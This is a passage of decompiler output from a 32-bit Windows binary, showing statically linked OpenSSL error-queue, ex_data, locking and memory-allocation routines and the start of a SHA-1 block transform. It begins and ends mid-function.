        dword_454828 = (int)sub_4206F0(
                              (int (__cdecl *)(char *))sub_41D580,
                              (int (__cdecl *)(const char *, const char *))sub_41D5C0),
        sub_420360(),
        (v3 = dword_454828) != 0) )
  {
    v4 = (unsigned int *)v3;
    if ( v3 )
    {
      for ( ; *a1; a1 += 2 )
      {
        if ( a2 )
          *a1 |= (unsigned __int8)a2 << 24;
        sub_420770(v4, (int)a1);
      }
    }
  }
  sub_41E2C0(10, 1, (int)".\\crypto\\err\\err.c", 535);
}
// 41D580: using guessed type int sub_41D580();
// 454828: using guessed type int dword_454828;

//----- (0041D930) --------------------------------------------------------
int __cdecl sub_41D930(unsigned int a1)
{
  _DWORD *v1; // esi
  unsigned int v3; // [esp+4h] [ebp-8h] BYREF

  v3 = a1 & 0xFF000000 | (((a1 >> 12) & 0xFFF) << 12);
  v1 = 0;
  sub_41E2C0(5, 1, (int)".\\crypto\\err\\err.c", 296);
  if ( dword_454828 )
    v1 = sub_420870(dword_454828, (int)&v3);
  sub_41E2C0(6, 1, (int)".\\crypto\\err\\err.c", 300);
  if ( v1 )
    return v1[1];
  else
    return 0;
}
// 454828: using guessed type int dword_454828;

//----- (0041D9C0) --------------------------------------------------------
_DWORD *sub_41D9C0()
{
  _DWORD *v0; // esi
  _BYTE *v1; // eax
  _DWORD *v2; // eax
  int v3; // ecx
  char *v4; // edi
  _DWORD v6[2]; // [esp+8h] [ebp-19Ch] BYREF
  _DWORD v7[100]; // [esp+10h] [ebp-194h] BYREF

  sub_4208A0(v6);
  sub_420920(v7, v6);
  v0 = sub_41D600((int)v7);
  if ( !v0 )
  {
    v1 = sub_41DFF0(400, (int)".\\crypto\\err\\err.c", 886);
    v0 = v1;
    if ( !v1 )
      return &unk_454698;
    sub_420920(v1, v6);
    v0[98] = 0;
    v0[99] = 0;
    v2 = v0 + 50;
    v3 = 16;
    do
    {
      *(v2 - 16) = 0;
      *v2++ = 0;
      --v3;
    }
    while ( v3 );
    v4 = (char *)sub_41D680((int)v0);
    if ( sub_41D600((int)v0) != v0 )
    {
      sub_41D840((char *)v0);
      return &unk_454698;
    }
    sub_41D840(v4);
  }
  return v0;
}
// 41D9C0: using guessed type _DWORD var_19C[2];
// 41D9C0: using guessed type _DWORD var_194[100];

//----- (0041DAC0) --------------------------------------------------------
int *__cdecl sub_41DAC0(int a1, int a2)
{
  int v2; // esi
  int *result; // eax
  int *v4; // ebx
  int v5; // edi
  int v6; // eax
  const char *v7; // ebp
  int *v8; // eax
  int *v9; // edi
  int v10; // esi
  int v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h]

  v2 = 80;
  result = (int *)sub_41DFF0(81, (int)".\\crypto\\err\\err.c", 951);
  v4 = result;
  v5 = 0;
  if ( result )
  {
    *(_BYTE *)result = 0;
    v11 = 0;
    if ( a1 > 0 )
    {
      v6 = a2 - 4;
      do
      {
        v7 = *(const char **)(v6 + 4);
        v6 += 4;
        v12 = v6;
        if ( v7 )
        {
          v5 += strlen(v7);
          if ( v5 > v2 )
          {
            v2 = v5 + 20;
            v8 = (int *)sub_41E0B0(v4, v5 + 21, (int)".\\crypto\\err\\err.c", 964);
            if ( !v8 )
              return (int *)sub_41E130(v4);
            v4 = v8;
          }
          sub_420990((char *)v4, v7, v2 + 1);
          v6 = v12;
        }
        ++v11;
      }
      while ( v11 < a1 );
    }
    result = sub_41D9C0();
    v9 = result;
    v10 = result[98];
    if ( !v10 )
      v10 = 15;
    if ( (result[v10 + 50] & 1) != 0 )
    {
      result = (int *)sub_41E130((void *)result[v10 + 34]);
      v9[v10 + 34] = 0;
    }
    v9[v10 + 34] = (int)v4;
    v9[v10 + 50] = 3;
  }
  return result;
}

//----- (0041DBE0) --------------------------------------------------------
void sub_41DBE0()
{
  sub_41D890(&dword_44C5B8, 0);
  sub_41D890(&dword_44C718, 0);
  sub_41D890(&dword_44C6B8, 2);
  sub_41D740();
  sub_41D890(&dword_454198, 2);
}
// 44C5B8: using guessed type _DWORD dword_44C5B8;
// 44C6B8: using guessed type _DWORD dword_44C6B8;
// 44C718: using guessed type _DWORD dword_44C718;
// 454198: using guessed type _DWORD dword_454198;

//----- (0041DC20) --------------------------------------------------------
void __cdecl sub_41DC20(int a1, _DWORD *a2)
{
  sub_41D890(&dword_44C5B8, 0);
  sub_41D890(&dword_44C718, 0);
  sub_41D890(&dword_44C6B8, 2);
  sub_41D740();
  sub_41D890(&dword_454198, 2);
  sub_41D890(a2, a1);
}
// 44C5B8: using guessed type _DWORD dword_44C5B8;
// 44C6B8: using guessed type _DWORD dword_44C6B8;
// 44C718: using guessed type _DWORD dword_44C718;
// 454198: using guessed type _DWORD dword_454198;

//----- (0041DC70) --------------------------------------------------------
int (__cdecl *__cdecl sub_41DC70(unsigned __int8 a1, __int16 a2, __int16 a3, int a4, int a5))(_DWORD, _DWORD)
{
  _DWORD *v5; // esi
  int v6; // eax
  int v7; // ecx
  int (__cdecl *result)(_DWORD, _DWORD); // eax

  v5 = sub_41D9C0();
  v6 = (v5[98] + 1) % 16;
  v7 = v5[99];
  v5[98] = v6;
  if ( v6 == v7 )
    v5[99] = (v7 + 1) % 16;
  v5[v6 + 2] = 0;
  v5[v5[98] + 18] = a3 & 0xFFF | (a1 << 24) | ((a2 & 0xFFF) << 12);
  v5[v5[98] + 66] = a4;
  v5[v5[98] + 82] = a5;
  result = (int (__cdecl *)(_DWORD, _DWORD))v5[98];
  if ( (v5[(_DWORD)result + 50] & 1) != 0 )
  {
    result = sub_41E130((void *)v5[(_DWORD)result + 34]);
    v5[v5[98] + 34] = 0;
    v5[v5[98] + 50] = 0;
  }
  else
  {
    v5[(_DWORD)result + 50] = 0;
  }
  return result;
}

//----- (0041DD50) --------------------------------------------------------
int *sub_41DD50(int a1, ...)
{
  va_list va; // [esp+8h] [ebp+8h] BYREF

  va_start(va, a1);
  return sub_41DAC0(a1, (int)va);
}

//----- (0041DD70) --------------------------------------------------------
int __cdecl sub_41DD70(void *Buf, size_t MaxCount)
{
  unsigned __int8 v2; // bl
  int result; // eax
  size_t v4; // ecx

  v2 = byte_454834;
  result = (int)Buf;
  v4 = MaxCount;
  if ( Buf )
  {
    if ( MaxCount )
    {
      do
      {
        *(_BYTE *)result++ = v2;
        --v4;
        v2 += (result & 0xF) + 17;
      }
      while ( v4 );
    }
    result = (int)memchr(Buf, v2, MaxCount);
    if ( result )
      v2 += result + 63;
    byte_454834 = v2;
  }
  return result;
}
// 454834: using guessed type char byte_454834;

//----- (0041DDC0) --------------------------------------------------------
char *__cdecl sub_41DDC0(unsigned int a1)
{
  int **v1; // esi
  int *v2; // eax

  if ( a1 > 0xF )
  {
    sub_41DC70(0xFu, 113, 65, (int)".\\crypto\\ex_data.c", 149);
    return 0;
  }
  else
  {
    v1 = (int **)((char *)&unk_454838 + 4 * a1);
    sub_41E2C0(9, 2, (int)".\\crypto\\ex_data.c", 154);
    if ( *v1 )
      return (char *)&unk_454838 + 4 * a1;
    v2 = sub_420B30();
    *v1 = v2;
    if ( v2 && sub_420A90(v2, 0) )
    {
      return (char *)&unk_454838 + 4 * a1;
    }
    else
    {
      sub_41DC70(0xFu, 113, 65, (int)".\\crypto\\ex_data.c", 161);
      sub_41E2C0(10, 2, (int)".\\crypto\\ex_data.c", 162);
      return 0;
    }
  }
}

//----- (0041DE60) --------------------------------------------------------
char *__cdecl sub_41DE60(unsigned int a1, int a2, int **a3)
{
  char *v3; // edi
  char *result; // eax
  int **v5; // ebp
  int v6; // eax
  int v7; // ebx
  int i; // esi
  int j; // esi
  int v10; // eax
  int v11; // eax
  char v12[40]; // [esp+8h] [ebp-28h] BYREF

  v3 = 0;
  result = sub_41DDC0(a1);
  v5 = (int **)result;
  if ( !result )
    return result;
  v6 = sub_420AD0(*(_DWORD *)result);
  v7 = v6;
  if ( v6 > 0 )
  {
    if ( v6 < 10 )
    {
      v3 = v12;
      goto LABEL_6;
    }
    v3 = sub_41DFF0(4 * v6, (int)".\\crypto\\ex_data.c", 393);
    if ( v3 )
    {
LABEL_6:
      for ( i = 0; i < v7; ++i )
        *(_DWORD *)&v3[4 * i] = sub_420AE0(*v5, i);
    }
  }
  sub_41E2C0(10, 2, (int)".\\crypto\\ex_data.c", 398);
  if ( v7 > 0 && !v3 )
    return (char *)sub_41DC70(0xFu, 111, 65, (int)".\\crypto\\ex_data.c", 401);
  for ( j = 0; j < v7; ++j )
  {
    v10 = *(_DWORD *)&v3[4 * j];
    if ( v10 && *(_DWORD *)(v10 + 12) )
    {
      if ( *a3 && j < sub_420AD0((int)*a3) )
        v11 = sub_420AE0(*a3, j);
      else
        v11 = 0;
      (*(void (__cdecl **)(int, int, int **, int, _DWORD, _DWORD))(*(_DWORD *)&v3[4 * j] + 12))(
        a2,
        v11,
        a3,
        j,
        **(_DWORD **)&v3[4 * j],
        *(_DWORD *)(*(_DWORD *)&v3[4 * j] + 4));
    }
  }
  if ( v3 != v12 )
    sub_41E130(v3);
  result = (char *)sub_420AB0((void **)*a3);
  *a3 = 0;
  return result;
}

//----- (0041DFC0) --------------------------------------------------------
int __cdecl sub_41DFC0(void *Block, size_t Size)
{
  return off_44C860(Block, Size);
}
// 44C860: using guessed type int (__cdecl *off_44C860)(_DWORD, _DWORD);

//----- (0041DFF0) --------------------------------------------------------
_BYTE *__cdecl sub_41DFF0(signed int Size, int a2, int a3)
{
  _BYTE *v4; // ebx

  if ( Size <= 0 )
    return 0;
  if ( dword_44C850 )
    dword_44C850 = 0;
  if ( dword_454878 )
  {
    if ( dword_44C854 )
      dword_44C854 = 0;
    dword_454878(0, Size, a2, a3, 0);
  }
  v4 = (_BYTE *)off_44C85C(Size, a2, a3);
  if ( dword_454878 )
    dword_454878(v4, Size, a2, a3, 1);
  if ( v4 )
  {
    if ( Size > 2048 )
      *v4 = byte_454834;
  }
  return v4;
}
// 44C850: using guessed type int dword_44C850;
// 44C854: using guessed type int dword_44C854;
// 44C85C: using guessed type int (__cdecl *off_44C85C)(_DWORD, _DWORD, _DWORD);
// 454834: using guessed type char byte_454834;
// 454878: using guessed type int (__cdecl *dword_454878)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041E080) --------------------------------------------------------
_BYTE *__cdecl sub_41E080(size_t Size, int a2, int a3)
{
  _BYTE *result; // eax
  _BYTE *v4; // esi

  result = sub_41DFF0(Size, a2, a3);
  v4 = result;
  if ( result )
  {
    memset(result, 0, Size);
    return v4;
  }
  return result;
}

//----- (0041E0B0) --------------------------------------------------------
_BYTE *__cdecl sub_41E0B0(void *Block, signed int Size, int a3, int a4)
{
  _BYTE *result; // eax
  _BYTE *Blocka; // [esp+8h] [ebp+4h]

  if ( !Block )
    return sub_41DFF0(Size, a3, a4);
  if ( Size <= 0 )
    return 0;
  if ( dword_45487C )
    dword_45487C(Block, 0, Size, a3, a4, 0);
  result = (_BYTE *)off_44C864(Block, Size, a3, a4);
  Blocka = result;
  if ( dword_45487C )
  {
    dword_45487C(Block, result, Size, a3, a4, 1);
    return Blocka;
  }
  return result;
}
// 44C864: using guessed type int (__cdecl *off_44C864)(_DWORD, _DWORD, _DWORD, _DWORD);
// 45487C: using guessed type int (__cdecl *dword_45487C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041E130) --------------------------------------------------------
int (__cdecl *__cdecl sub_41E130(void *Block))(_DWORD, _DWORD)
{
  int (__cdecl *result)(_DWORD, _DWORD); // eax

  if ( dword_454880 )
    dword_454880(Block, 0);
  off_44C868(Block);
  result = dword_454880;
  if ( dword_454880 )
    return (int (__cdecl *)(_DWORD, _DWORD))dword_454880(0, 1);
  return result;
}
// 44C868: using guessed type int (__cdecl *off_44C868)(_DWORD);
// 454880: using guessed type int (__cdecl *dword_454880)(_DWORD, _DWORD);

//----- (0041E170) --------------------------------------------------------
void __cdecl sub_41E170(int a1)
{
  int v1; // edi
  _DWORD *v2; // eax
  _DWORD *v3; // esi

  v1 = a1;
  if ( a1 )
    v1 = -1 - a1;
  if ( dword_4548B0 )
  {
    sub_41E2C0(9, 29, ".\\crypto\\lock.c", 301);
    if ( dword_45489C && v1 < sub_420AD0(dword_45489C) )
    {
      v2 = (_DWORD *)sub_420AE0((int *)dword_45489C, v1);
      v3 = v2;
      if ( v2 )
      {
        if ( (int)--*v2 > 0 )
          v3 = 0;
        else
          sub_420B00((int *)dword_45489C, v1, 0);
      }
      sub_41E2C0(10, 29, ".\\crypto\\lock.c", 321);
      if ( v3 )
      {
        dword_4548B0(v3[1], ".\\crypto\\lock.c", 324);
        sub_41E130(v3);
      }
    }
    else
    {
      sub_41E2C0(10, 29, ".\\crypto\\lock.c", 304);
    }
  }
}
// 41E2C0: using guessed type _DWORD __cdecl sub_41E2C0(_DWORD, _DWORD, _DWORD, _DWORD);
// 45489C: using guessed type int dword_45489C;
// 4548B0: using guessed type int (__cdecl *dword_4548B0)(_DWORD, _DWORD, _DWORD);

//----- (0041E240) --------------------------------------------------------
int __cdecl sub_41E240(int a1)
{
  int v1; // edi
  _DWORD *v2; // esi
  _DWORD *v3; // eax

  v1 = a1;
  v2 = 0;
  if ( a1 )
    v1 = -1 - a1;
  sub_41E2C0(9, 29, ".\\crypto\\lock.c", 335);
  if ( dword_45489C )
  {
    if ( v1 < sub_420AD0(dword_45489C) )
    {
      v3 = (_DWORD *)sub_420AE0((int *)dword_45489C, v1);
      v2 = v3;
      if ( v3 )
        ++*v3;
    }
  }
  sub_41E2C0(10, 29, ".\\crypto\\lock.c", 342);
  if ( v2 )
    return v2[1];
  else
    return 0;
}
// 41E2C0: using guessed type _DWORD __cdecl sub_41E2C0(_DWORD, _DWORD, _DWORD, _DWORD);
// 45489C: using guessed type int dword_45489C;

//----- (0041E2C0) --------------------------------------------------------
void __cdecl sub_41E2C0(int a1, int a2, int a3, int a4)
{
  int v4; // esi

  if ( a2 >= 0 )
  {
    if ( dword_4548A0 )
      dword_4548A0(a1, a2, a3, a4);
  }
  else if ( dword_4548AC )
  {
    v4 = sub_41E240(a2);
    if ( !v4 )
      sub_420E20(".\\crypto\\lock.c", 448, "pointer != NULL");
    dword_4548AC(a1, v4, a3, a4);
    sub_41E170(a2);
  }
}
// 4548A0: using guessed type int (__cdecl *dword_4548A0)(_DWORD, _DWORD, _DWORD, _DWORD);
// 4548AC: using guessed type int (__cdecl *dword_4548AC)(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (0041E340) --------------------------------------------------------
int __cdecl sub_41E340(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  int v6; // esi

  if ( dword_4548A4 )
    return dword_4548A4();
  sub_41E2C0(9, a3, a4, a5);
  v6 = a2 + *a1;
  *a1 = v6;
  sub_41E2C0(10, a3, a4, a5);
  return v6;
}
// 4548A4: using guessed type int (*dword_4548A4)(void);

//----- (0041E390) --------------------------------------------------------
int __cdecl sub_41E390(_DWORD *a1)
{
  memset(a1, 0, 0x60u);
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  a1[4] = -1009589776;
  return 1;
}

//----- (0041E3D0) --------------------------------------------------------
unsigned int *__cdecl sub_41E3D0(int *a1, unsigned int *a2, int a3)
{
  unsigned int *result; // eax
  int v4; // ebx
  int v5; // ebp
  int v6; // esi
  int v7; // edi
  int v8; // esi
  int v9; // ebp
  int v10; // edi
  int v11; // ebx
  int v12; // esi
  int v13; // ebp
  int v14; // edi
  int v15; // ebx
  int v16; // esi
  int v17; // ebp
  int v18; // edi
  int v19; // ebx
  int v20; // esi
  int v21; // ebp
  int v22; // edi
  int v23; // ebx
  int v24; // esi
  unsigned int v25; // edx
  int v26; // edi
  unsigned int v27; // ecx
  int v28; // ebx
  int v29; // ebp
  int v30; // esi
  int v31; // ebx
  int v32; // ebp
  int v33; // ebx
  int v34; // ebx
  int v35; // edx
  int v36; // edi
  int v37; // ebx
  int v38; // ebp
  int v39; // esi
  int v40; // ecx
  int v41; // ebx
  int v42; // ebx
  int v43; // ebp
  int v44; // ebx
  int v45; // edi
  int v46; // ecx
  int v47; // ebx
  int v48; // edx
  int v49; // ebp
  int v50; // edi
  int v51; // ebp
  int v52; // edi
  int v53; // ebp
  int v54; // ebp
  int v55; // ebp
  int v56; // edi
  int v57; // ebp
  int v58; // ebp
  int v59; // esi
  int v60; // ebp
  int v61; // esi
  int v62; // ebx
  int v63; // ebp
  int v64; // ebx
  int v65; // ecx
  int v66; // ebx
  int v67; // edx
  int v68; // ebx
  int v69; // ebx
  int v70; // ebx
  int v71; // ebx
  int v72; // edi
  int v73; // ebp
  int v74; // esi
  int v75; // ebp
  int v76; // edx
  int v77; // esi
  int v78; // edx
  bool v79; // zf
  int v80; // [esp+10h] [ebp-4Ch]
  int v81; // [esp+10h] [ebp-4Ch]
  int v82; // [esp+10h] [ebp-4Ch]
  int v83; // [esp+10h] [ebp-4Ch]
  int v84; // [esp+10h] [ebp-4Ch]
  int v85; // [esp+10h] [ebp-4Ch]
  int v86; // [esp+10h] [ebp-4Ch]
  int v87; // [esp+10h] [ebp-4Ch]
  int v88; // [esp+10h] [ebp-4Ch]
  int v89; // [esp+10h] [ebp-4Ch]
  int v90; // [esp+10h] [ebp-4Ch]
  int v91; // [esp+10h] [ebp-4Ch]
  int v92; // [esp+10h] [ebp-4Ch]
  int v93; // [esp+10h] [ebp-4Ch]
  int v94; // [esp+10h] [ebp-4Ch]
  int v95; // [esp+10h] [ebp-4Ch]
  int v96; // [esp+10h] [ebp-4Ch]
  int v97; // [esp+10h] [ebp-4Ch]
  int v98; // [esp+10h] [ebp-4Ch]
  int v99; // [esp+10h] [ebp-4Ch]
  int v100; // [esp+10h] [ebp-4Ch]
  int v101; // [esp+14h] [ebp-48h]
  int v102; // [esp+14h] [ebp-48h]
  int v103; // [esp+14h] [ebp-48h]
  int v104; // [esp+14h] [ebp-48h]
  int v105; // [esp+14h] [ebp-48h]
  int v106; // [esp+14h] [ebp-48h]
  int v107; // [esp+14h] [ebp-48h]
  int v108; // [esp+14h] [ebp-48h]
  int v109; // [esp+14h] [ebp-48h]
  int v110; // [esp+14h] [ebp-48h]
  int v111; // [esp+14h] [ebp-48h]
  int v112; // [esp+14h] [ebp-48h]
  int v113; // [esp+14h] [ebp-48h]
  int v114; // [esp+14h] [ebp-48h]
  int v115; // [esp+14h] [ebp-48h]
  int v116; // [esp+14h] [ebp-48h]
  int v117; // [esp+14h] [ebp-48h]
  int v118; // [esp+14h] [ebp-48h]
  int v119; // [esp+14h] [ebp-48h]
  int v120; // [esp+14h] [ebp-48h]
  int i; // [esp+18h] [ebp-44h]
  int v122; // [esp+18h] [ebp-44h]
  int v123; // [esp+18h] [ebp-44h]
  int v124; // [esp+18h] [ebp-44h]
  int v125; // [esp+18h] [ebp-44h]
  int v126; // [esp+18h] [ebp-44h]
  int v127; // [esp+18h] [ebp-44h]
  int v128; // [esp+18h] [ebp-44h]
  int v129; // [esp+18h] [ebp-44h]
  int v130; // [esp+18h] [ebp-44h]
  int v131; // [esp+18h] [ebp-44h]
  int v132; // [esp+18h] [ebp-44h]
  int v133; // [esp+18h] [ebp-44h]
  int v134; // [esp+18h] [ebp-44h]
  int v135; // [esp+18h] [ebp-44h]
  int v136; // [esp+18h] [ebp-44h]
  int v137; // [esp+18h] [ebp-44h]
  int v138; // [esp+18h] [ebp-44h]
  int v139; // [esp+18h] [ebp-44h]
  int v140; // [esp+1Ch] [ebp-40h]
  int v141; // [esp+1Ch] [ebp-40h]
  int v142; // [esp+1Ch] [ebp-40h]
  int v143; // [esp+1Ch] [ebp-40h]
  int v144; // [esp+1Ch] [ebp-40h]
  int v145; // [esp+1Ch] [ebp-40h]
  int v146; // [esp+1Ch] [ebp-40h]
  int v147; // [esp+1Ch] [ebp-40h]
  int v148; // [esp+1Ch] [ebp-40h]
  int v149; // [esp+1Ch] [ebp-40h]
  int v150; // [esp+1Ch] [ebp-40h]
  int v151; // [esp+1Ch] [ebp-40h]
  int v152; // [esp+1Ch] [ebp-40h]
  int v153; // [esp+1Ch] [ebp-40h]
  int v154; // [esp+1Ch] [ebp-40h]
  int v155; // [esp+1Ch] [ebp-40h]
  int v156; // [esp+1Ch] [ebp-40h]
  int v157; // [esp+1Ch] [ebp-40h]
  int v158; // [esp+1Ch] [ebp-40h]
  int v159; // [esp+1Ch] [ebp-40h]
  int v160; // [esp+1Ch] [ebp-40h]
  int v161; // [esp+20h] [ebp-3Ch]
  int v162; // [esp+20h] [ebp-3Ch]
  int v163; // [esp+20h] [ebp-3Ch]
  int v164; // [esp+20h] [ebp-3Ch]
  int v165; // [esp+20h] [ebp-3Ch]
  int v166; // [esp+20h] [ebp-3Ch]
  int v167; // [esp+20h] [ebp-3Ch]
  int v168; // [esp+20h] [ebp-3Ch]
  int v169; // [esp+20h] [ebp-3Ch]
  int v170; // [esp+20h] [ebp-3Ch]
  int v171; // [esp+20h] [ebp-3Ch]
  int v172; // [esp+20h] [ebp-3Ch]
  int v173; // [esp+20h] [ebp-3Ch]
  int v174; // [esp+20h] [ebp-3Ch]
  int v175; // [esp+20h] [ebp-3Ch]
  int v176; // [esp+20h] [ebp-3Ch]
  int v177; // [esp+20h] [ebp-3Ch]
  int v178; // [esp+20h] [ebp-3Ch]
  unsigned int v179; // [esp+24h] [ebp-38h]
  int v180; // [esp+24h] [ebp-38h]
  int v181; // [esp+24h] [ebp-38h]
  int v182; // [esp+24h] [ebp-38h]
  int v183; // [esp+24h] [ebp-38h]
  unsigned int v184; // [esp+28h] [ebp-34h]
  int v185; // [esp+28h] [ebp-34h]
  int v186; // [esp+28h] [ebp-34h]
  int v187; // [esp+28h] [ebp-34h]
  int v188; // [esp+28h] [ebp-34h]
  unsigned int v189; // [esp+2Ch] [ebp-30h]
  int v190; // [esp+2Ch] [ebp-30h]
  int v191; // [esp+2Ch] [ebp-30h]
  int v192; // [esp+2Ch] [ebp-30h]
  int v193; // [esp+2Ch] [ebp-30h]
  unsigned int v194; // [esp+30h] [ebp-2Ch]
  int v195; // [esp+30h] [ebp-2Ch]
  int v196; // [esp+30h] [ebp-2Ch]
  int v197; // [esp+30h] [ebp-2Ch]
  int v198; // [esp+30h] [ebp-2Ch]
  unsigned int v199; // [esp+34h] [ebp-28h]
  int v200; // [esp+34h] [ebp-28h]
  int v201; // [esp+34h] [ebp-28h]
  int v202; // [esp+34h] [ebp-28h]
  int v203; // [esp+34h] [ebp-28h]
  unsigned int v204; // [esp+38h] [ebp-24h]
  int v205; // [esp+38h] [ebp-24h]
  int v206; // [esp+38h] [ebp-24h]
  int v207; // [esp+38h] [ebp-24h]
  int v208; // [esp+38h] [ebp-24h]
  unsigned int v209; // [esp+3Ch] [ebp-20h]
  int v210; // [esp+3Ch] [ebp-20h]
  int v211; // [esp+3Ch] [ebp-20h]
  int v212; // [esp+3Ch] [ebp-20h]
  int v213; // [esp+3Ch] [ebp-20h]
  unsigned int v214; // [esp+40h] [ebp-1Ch]
  int v215; // [esp+40h] [ebp-1Ch]
  int v216; // [esp+40h] [ebp-1Ch]
  int v217; // [esp+40h] [ebp-1Ch]
  unsigned int v218; // [esp+44h] [ebp-18h]
  int v219; // [esp+44h] [ebp-18h]
  int v220; // [esp+44h] [ebp-18h]
  int v221; // [esp+44h] [ebp-18h]
  int v222; // [esp+44h] [ebp-18h]
  unsigned int v223; // [esp+48h] [ebp-14h]
  int v224; // [esp+48h] [ebp-14h]
  int v225; // [esp+48h] [ebp-14h]
  int v226; // [esp+48h] [ebp-14h]
  int v227; // [esp+48h] [ebp-14h]
  unsigned int v228; // [esp+4Ch] [ebp-10h]
  int v229; // [esp+4Ch] [ebp-10h]
  int v230; // [esp+4Ch] [ebp-10h]
  int v231; // [esp+4Ch] [ebp-10h]
  int v232; // [esp+4Ch] [ebp-10h]
  unsigned int v233; // [esp+50h] [ebp-Ch]
  int v234; // [esp+50h] [ebp-Ch]
  int v235; // [esp+50h] [ebp-Ch]
  int v236; // [esp+50h] [ebp-Ch]
  int v237; // [esp+50h] [ebp-Ch]
  unsigned int v238; // [esp+54h] [ebp-8h]
  int v239; // [esp+54h] [ebp-8h]
  int v240; // [esp+54h] [ebp-8h]
  int v241; // [esp+54h] [ebp-8h]
  unsigned int v242; // [esp+58h] [ebp-4h]
  int v243; // [esp+58h] [ebp-4h]
  int v244; // [esp+58h] [ebp-4h]
  int v245; // [esp+58h] [ebp-4h]
  int v246; // [esp+64h] [ebp+8h]
  int v247; // [esp+64h] [ebp+8h]
  int v248; // [esp+64h] [ebp+8h]
  int v249; // [esp+64h] [ebp+8h]
  int v250; // [esp+64h] [ebp+8h]
  int v251; // [esp+64h] [ebp+8h]
  int v252; // [esp+64h] [ebp+8h]
  int v253; // [esp+64h] [ebp+8h]
  int v254; // [esp+64h] [ebp+8h]
  int v255; // [esp+64h] [ebp+8h]
  int v256; // [esp+64h] [ebp+8h]
  int v257; // [esp+64h] [ebp+8h]
  int v258; // [esp+64h] [ebp+8h]
  int v259; // [esp+64h] [ebp+8h]
  int v260; // [esp+64h] [ebp+8h]
  int v261; // [esp+64h] [ebp+8h]
  int v262; // [esp+64h] [ebp+8h]
  int v263; // [esp+64h] [ebp+8h]
  int v264; // [esp+64h] [ebp+8h]
  int v265; // [esp+64h] [ebp+8h]
  int v266; // [esp+64h] [ebp+8h]
  int v267; // [esp+64h] [ebp+8h]

  result = a2;
  v4 = *a1;
  v5 = a1[1];
  v6 = a1[3];
  v7 = a1[2];
  v140 = v7;
  for ( i = a1[4]; ; i = v78 )
  {
    v223 = _byteswap_ulong(*result);
    v233 = _byteswap_ulong(result[1]);
    v246 = v6;
    v8 = v223 + __ROL4__(v4, 5) + (v6 ^ v5 & (v7 ^ v6)) + i + 1518500249;
    v179 = _byteswap_ulong(result[2]);
    v9 = __ROL4__(v5, 30);
    v10 = v233 + __ROL4__(v8, 5) + (v7 ^ v4 & (v9 ^ v7)) + v246 + 1518500249;
    v189 = _byteswap_ulong(result[3]);
    v80 = __ROL4__(v4, 30);
    v11 = v179 + __ROL4__(v10, 5) + (v9 ^ v8 & (v80 ^ v9)) + v140 + 1518500249;
    v101 = __ROL4__(v8, 30);
    v199 = _byteswap_ulong(result[4]);
    v209 = _byteswap_ulong(result[5]);
    v12 = v189 + __ROL4__(v11, 5) + (v80 ^ v10 & (v80 ^ v101)) + v9 + 1518500249;
    v13 = __ROL4__(v10, 30);
    v14 = v199 + __ROL4__(v12, 5) + (v101 ^ v11 & (v13 ^ v101)) + v80 + 1518500249;
    v218 = _byteswap_ulong(result[6]);
    v247 = __ROL4__(v11, 30);
    v15 = v209 + __ROL4__(v14, 5) + (v13 ^ v12 & (v247 ^ v13)) + v101 + 1518500249;
    v228 = _byteswap_ulong(result[7]);
    v141 = __ROL4__(v12, 30);
    v16 = v218 + __ROL4__(v15, 5) + (v247 ^ v14 & (v141 ^ v247)) + v13 + 1518500249;
    v184 = _byteswap_ulong(result[8]);
    v17 = __ROL4__(v14, 30);
    v18 = v228 + __ROL4__(v16, 5) + (v141 ^ v15 & (v17 ^ v141)) + v247 + 1518500249;
    v194 = _byteswap_ulong(result[9]);
    v81 = __ROL4__(v15, 30);
    v19 = v184 + __ROL4__(v18, 5) + (v17 ^ v16 & (v81 ^ v17)) + v141 + 1518500249;
    v102 = __ROL4__(v16, 30);
    v204 = _byteswap_ulong(result[10]);
    v20 = v194 + __ROL4__(v19, 5) + (v81 ^ v18 & (v81 ^ v102)) + v17 + 1518500249;
    v21 = __ROL4__(v18, 30);
    v214 = _byteswap_ulong(result[11]);
    v22 = v204 + __ROL4__(v20, 5) + (v102 ^ v19 & (v21 ^ v102)) + v81 + 1518500249;
    v242 = _byteswap_ulong(result[12]);
    v248 = __ROL4__(v19, 30);
    v23 = v214 + __ROL4__(v22, 5) + (v21 ^ v20 & (v248 ^ v21)) + v102 + 1518500249;
    v238 = _byteswap_ulong(result[13]);
    v142 = __ROL4__(v20, 30);
    v24 = v242 + __ROL4__(v23, 5) + (v248 ^ v22 & (v142 ^ v248)) + v21 + 1518500249;
    v25 = _byteswap_ulong(result[14]);
    v161 = __ROL4__(v22, 30);
    result += 16;
    v26 = v248 + v238 + __ROL4__(v24, 5) + (v142 ^ v23 & (v161 ^ v142)) + 1518500249;
    v27 = _byteswap_ulong(*(result - 1));
    v28 = __ROL4__(v23, 30);
    v249 = v142 + v25 + __ROL4__(v26, 5) + (v161 ^ v24 & (v28 ^ v161)) + 1518500249;
    v29 = __ROL4__(v26, 30);
    v103 = __ROL4__(v24, 30);
    v143 = v161 + v27 + __ROL4__(v249, 5) + (v28 ^ v26 & (v28 ^ v103)) + 1518500249;
    v224 = __ROL4__(v223 ^ v179 ^ v184 ^ v238, 1);
    v30 = v224 + v28 + __ROL4__(v143, 5) + (v103 ^ v249 & (v29 ^ v103)) + 1518500249;
    v31 = __ROL4__(v249, 30);
    v234 = __ROL4__(v233 ^ v189 ^ v194 ^ v25, 1);
    v82 = v234 + v103 + __ROL4__(v30, 5) + (v29 ^ v143 & (v31 ^ v29)) + 1518500249;
    v144 = __ROL4__(v143, 30);
    v180 = __ROL4__(v179 ^ v199 ^ v204 ^ v27, 1);
    v104 = v180 + v29 + __ROL4__(v82, 5) + (v31 ^ v30 & (v144 ^ v31)) + 1518500249;
    v162 = __ROL4__(v30, 30);
    v32 = v31 + __ROL4__(v104, 5) + (v144 ^ v82 & (v162 ^ v144));
    v83 = __ROL4__(v82, 30);
    v190 = __ROL4__(v224 ^ v189 ^ v209 ^ v214, 1);
    v122 = v190 + v32 + 1518500249;
    v200 = __ROL4__(v234 ^ v199 ^ v218 ^ v242, 1);
    v250 = v200 + v144 + __ROL4__(v122, 5) + (v83 ^ v162 ^ v104) + 1859775393;
    v105 = __ROL4__(v104, 30);
